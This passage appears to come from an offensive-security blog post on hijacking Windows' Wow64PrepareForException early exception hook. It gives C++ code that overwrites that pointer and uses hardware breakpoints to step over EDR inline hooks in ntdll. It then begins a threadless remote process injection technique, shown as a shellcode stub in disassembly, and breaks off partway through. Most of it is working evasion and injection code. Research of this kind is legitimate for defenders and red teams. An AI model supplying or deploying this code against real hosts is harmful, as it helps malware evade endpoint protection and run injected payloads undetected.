style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/hooked_ntfunction.jpg" alt="[hooked_ntfunction.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"><figcaption style="text-align:center;margin-top:.5rem">Hooked NtAllocateVirtualMemory</figcaption></figure><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/no_hook.jpg" alt="[]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"><figcaption style="text-align:center;margin-top:.5rem">NtAllocateVirtualMemory without hooks</figcaption></figure><p></p><p>In the above screenshots, we can see a hooked <code>ntdll!NtAllocateVirtualMemory</code> stub (on a host with an EDR) and an unhooked <code>ntdll!NtAllocateVirtualMemory</code> stub.</p><p>If we follow the hook, we can see that it takes a near jump to an offset within <code>ntdll</code> and lands in <code>ntdll!QueryRegistryValue</code> where eventually it performs another jump to the EDR’s injected hooking module. This hooking mechanism is consistent with other functions hooked by the EDR.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/hook_flow.jpg" alt="[hook_flow.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>To avoid stepping into the EDR’s hook, we can use the early exception handler to step over the hook. First we need to know the function that we are going to be using for whatever purpose we need.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_FUNCTION_ADDRESS_TABLE</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span>	<span class="n">NtAllocateVirtualMemoryAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span>	<span class="n">NtProtectVirtualMemoryAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FUNCTION_ADDRESS_TABLE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PFUNCTION_ADDRESS_TABLE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PFUNCTION_ADDRESS_TABLE</span>	<span class="n">functionAddressTable</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ---- snip ---- //
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">functionAddressTable</span><span class="o">-&gt;</span><span class="n">NtAllocateVirtualMemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">functionAddressTable</span><span class="o">-&gt;</span><span class="n">NtProtectVirtualMemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="s">"NtProtectVirtualMemory"</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NtAllocateVirtualMemory</span> <span class="n">ntAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span><span class="p">)</span><span class="n">functionAddressTable</span><span class="o">-&gt;</span><span class="n">NtAllocateVirtualMemoryAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">NtProtectVirtualMemory</span> <span class="n">ntProtectVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtProtectVirtualMemory</span><span class="p">)</span><span class="n">functionAddressTable</span><span class="o">-&gt;</span><span class="n">NtProtectVirtualMemoryAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ---- snip ---- //
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>We then find and overwrite the <code>Wow64PrepareForException</code> function pointer to point to our early exception handler.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">HookExceptionDispatcher</span><span class="p">(</span><span class="n">PBYTE</span> <span class="n">moduleBase</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">wow64PrepareForException</span> <span class="o">=</span> <span class="n">ReturnWow64FunctionPointer</span><span class="p">(</span><span class="n">moduleBase</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">wow64PrepareForException</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">printf</span><span class="p">(</span><span class="s">"[ - ] Failed to get Wow64PrepareForException function pointer.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">"[ * ] Wow64PrepareForException address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wow64PrepareForException</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// write pointer to ExceptionHandler
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="n">wow64PrepareForException</span> <span class="o">=</span> <span class="n">ExceptionHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_READONLY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">"[ * ] pointer to ExceptionHandler written to: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wow64PrepareForException</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">wow64PrepareForException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>We then identify where the hooks are placed. In this example we know that the EDR places the hook 3 bytes from the stub entry point. Next we set a hardware breakpoint on the address of the hook in the stub. When we reach this instruction and attempt to execute it, we will cause an exception.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">SetHardwareBreakpoint</span><span class="p">(</span><span class="n">ULONG_PTR</span> <span class="n">ntFunctionAddress</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD64</span> <span class="n">inlineHookAddress</span> <span class="o">=</span> <span class="n">ntFunctionAddress</span> <span class="o">+</span> <span class="mi">3ull</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// check if the the hook is present
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// skip setting a HWBP if it is not and call the NT function normally
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">inlineHookAddress</span> <span class="o">!=</span> <span class="mh">0xE9</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">printf</span><span class="p">(</span><span class="s">"[ * ] Instruction at address 0x%p is not hooked</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">inlineHookAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">"[ * ] Setting hardware breakpoint at address: 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">inlineHookAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">CONTEXT</span> <span class="n">context</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">RtlCaptureContext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_DEBUG_REGISTERS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">context</span><span class="p">.</span><span class="n">Dr0</span> <span class="o">=</span> <span class="n">inlineHookAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">context</span><span class="p">.</span><span class="n">Dr7</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">NtContinue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">context</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>Once we run a hooked function, we will reach the EDR hook which in turn will trigger the exception. This will go through the exception and interrupt process all the way to <code>ntdll!KiUserExceptionDispatcher</code> and then to our early exception handler. Once at our exception handler, we will perform the following:</p><ul><li>Remove the hardware breakpoint</li><li>Set <code>RAX</code> to the appropriate <code>SSN</code></li><li>Set <code>RIP</code> to the <code>syscall</code> instruction address (we can also set it to directly after the hook)</li><li>Continue execution</li></ul><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">ExceptionHandler</span><span class="p">(</span><span class="n">PEXCEPTION_RECORD</span> <span class="n">exceptionRecord</span><span class="p">,</span> <span class="n">PCONTEXT</span> <span class="n">contextRecord</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">exceptionRecord</span><span class="o">-&gt;</span><span class="n">ExceptionCode</span> <span class="o">==</span> <span class="n">STATUS_SINGLE_STEP</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rip</span> <span class="o">==</span> <span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Dr0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Dr0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>														<span class="c1">// remove the hardware breakpoint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rax</span> <span class="o">=</span> <span class="n">ReturnFunctionsSSN</span><span class="p">(</span><span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rip</span><span class="p">);</span>				<span class="c1">// set rax to SSN						
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">ReturnSyscallInstructionAddress</span><span class="p">(</span><span class="n">contextRecord</span><span class="o">-&gt;</span><span class="n">Rip</span><span class="p">);</span>	<span class="c1">// set rip to syscall instruction address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">NtContinue</span><span class="p">(</span><span class="n">contextRecord</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>											<span class="c1">// continue execution									
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>We repeat this process for every API that we want to use and finally clean up by restoring <code>Wow64PrepareForException</code>.</p><div class="highlight"><div class="code-title">C++<button class="copy-button">Copy</button></div><div class="chroma"><table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">UnhookExceptionDispatcher</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">wow64PrepareForException</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// restore original function pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="n">wow64PrepareForException</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">wow64PrepareForException</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_READONLY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></tbody></table></div></div><p>When stepping through the program with WinDbg, we can see that once execution hits the EDR’s hook we raise a <code>STATUS_SINGLE_STEP</code> exception. This will transfer the execution to <code>ntdll!KiUserExceptionDispatcher</code>, thus not taking the jump to <code>ntdll!QueryRegistryValue</code>.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/step_throug_stepoverfinal.jpg" alt="[step_throug_stepoverfinal.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>Inside <code>ntdll!KiUserExceptionDispatcher</code> we are eventually redirected to our early exception hook.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/step_throug_stepoverfinal_2.jpg" alt="[step_throug_stepoverfinal_2 1.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>Once inside our early exception handler, we remove the hardware breakpoint, set the correct SSN, set the <code>RIP</code> to the <code>syscall</code> instruction address in the function and resume execution using <code>ntdll.dll!NtContinue</code>.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/2025-08-16_13-47-53.jpg" alt="[2025-08-16_13-47-53.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>Once <code>ntdll.dll!NtContinue</code> is called, it performs a context switch and resumes execution to where we pointed <code>RIP</code> to, in our case it is the <code>syscall</code> instruction in <code>ntdll!NtAllocateVirtualMemory</code>.</p><p></p><figure style="--img-max:900px;display:flex;flex-direction:column;align-items:center"><img src="https://kr0tt.github.io/images/Early-Exception-Hooking/step_throug_stepoverfinal_3.jpg" alt="[step_throug_stepoverfinal_3.jpg]" loading="lazy" style="display:block !important;margin:0 auto !important;height:auto !important;width:auto !important;max-width:min(100%,var(--img-max)) !important"></figure><p></p><p>You can find the code for this example <a href="https://github.com/kr0tt/EarlyExceptionHandling/tree/main/KiUserExceptionDispatcherStepOver">here</a>.</p><h3 id="threadless-injection-using-kiuserexceptiondispatcher---wow64prepareforexception">Threadless Injection Using KiUserExceptionDispatcher &amp; Wow64PrepareForException<a href="https://kr0tt.github.io/posts/early-exception-handling/#threadless-injection-using-kiuserexceptiondispatcher---wow64prepareforexception" class="hanchor" arialabel="Anchor">#</a></h3><p>Classic remote process injection typically follows the following steps:</p><ul><li>Allocate memory for the payload in the remote process</li><li>Write the payload to the remote process</li><li>Execute the payload in the remote process using a preferred method (new thread, thread hijack, APC etc.)</li></ul><p>There are of course different methods and nuances to accomplish this goal, but in the end these are the primitives for most remote process injection, and EDR vendors are well aware of it. Previous experience and research conducted by different people and organizations shows that most of the focus for detection and prevention of remote process injection occurs at the final step: the execution primitive.</p><p>Prior work in threadless injection techniques produced the following projects: <a href="https://github.com/CCob/ThreadlessInject">ThreadlessInject</a>, <a href="https://github.com/SafeBreach-Labs/PoolParty">PoolParty</a>, <a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/">Early Cascade Injection</a> and others.</p><p>We can use our early exception handler for threadless remote process injection as well. The idea is quite similar, even a bit easier to implement, than the previous example. In this example we are going to overwrite the <code>Wow64PrepareForException</code> function pointer in the remote process to point to our shellcode, and then we are going to cause an exception in the remote process.</p><p>Apart from executing our payload without creating or hijacking a thread or queuing a remote APC and instead solely relying on intra-process execution, we can execute our shellcode before the EDR’s hooking module is initialized. Different EDRs hook a newly created process at different stages during the process initialization. The <a href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/">Early Cascade Injection</a> injection method describes this in great detail, check it out.</p><blockquote><p>Because our exception handling logic relies only on <code>ntdll!KiUserExceptionDispatcher</code> and some shellcode we inject, we can in theory inject our custom shellcode, cause an exception, and interfere in the hooking process of the EDR in the injected process as early as we want.</p></blockquote><p>To kick off the remote process injection we first find the <code>Wow64PrepareForException</code> function pointer address in our process. Because this function pointer resides in <code>ntdll.dll</code> we can be confident that it will be at same address in a remote process on the same system. We went over the steps of finding the address for the function pointer in the previous example.</p><p>We then create a suspended process and allocate memory in the remote process for our payload and for the shellcode stub. The shellcode stub will be pointed to by <code>Wow64PrepareForException</code> and called by <code>ntdll!KiUserExceptionDispatcher</code>. Once executed, the shellcode stub will restore <code>Wow64PrepareForException</code> to its previous state to avoid calling our payload multiple times and finally transfer execution to the payload.</p><pre tabindex="0"><code>0: &nbsp;4c 8b dc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;r11,rsp  
+3: &nbsp;57 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;push &nbsp; rdi  
+4: &nbsp;48 83 ec 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp;rsp,0x30  
+8: &nbsp;48 b8 aa aa aa aa aa &nbsp; &nbsp;movabs rax,0xaaaaaaaaaaaaaaaa    ; wow64PrepareForException  
+f: &nbsp;aa aa aa  
+12: 49 c7 43 18 08 00 00 &nbsp; &nbsp;mov &nbsp; &nbsp;QWORD PTR [r11+0x18],0x8  
+19: 00  
+1a: 49 89 43 20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;QWORD PTR [r11+0x20],rax  
+1e: 4d 8d 43 18 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp;r8,[r11+0x18]  
+22: 49 8d 43 08 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp;rax,[r11+0x8]  
+26: c7 44 24 40 00 00 00 &nbsp; &nbsp;mov &nbsp; &nbsp;DWORD PTR [rsp+0x40],0x0  
+2d: 00  
+2e: 41 b9 04 00 00 00 &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;r9d,0x4  
+34: 49 89 43 e8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;QWORD PTR [r11-0x18],rax  
+38: 49 8d 53 20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp;rdx,[r11+0x20]  
+3c: c7 44 24 48 00 00 00 &nbsp; &nbsp;mov &nbsp; &nbsp;DWORD PTR [rsp+0x48],0x0  
+43: 00  
+44: 48 83 c9 ff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or &nbsp; &nbsp; rcx,0xffffffffffffffff  
+48: 48 bf cc cc cc cc cc &nbsp; &nbsp;movabs rdi,0xcccccccccccccccc     ; NtProtectVirtualMemory
+4f: cc cc cc  
+52: ff d7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call &nbsp; rdi  
+54: 33 c0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp;eax,eax  
+56: 4c 8d 44 24 50 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;lea &nbsp; &nbsp;r8,[rsp+0x50]  
+5b: 48 a3 aa aa aa aa aa &nbsp; &nbsp;movabs ds:0xaaaaaaaaaaaaaaaa,rax  ; wow64PrepareForException
+62: aa aa aa  
+65: 48 8d 54 24 58 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;lea &nbsp; &nbsp;rdx,[rsp+0x58]  
+6a: 44 8b 4c 24 40 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;r9d,DWORD PTR [rsp+0x40]  
+6f: 48 8d 44 24 48 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;lea &nbsp; &nbsp;rax,[rsp+0x48]  
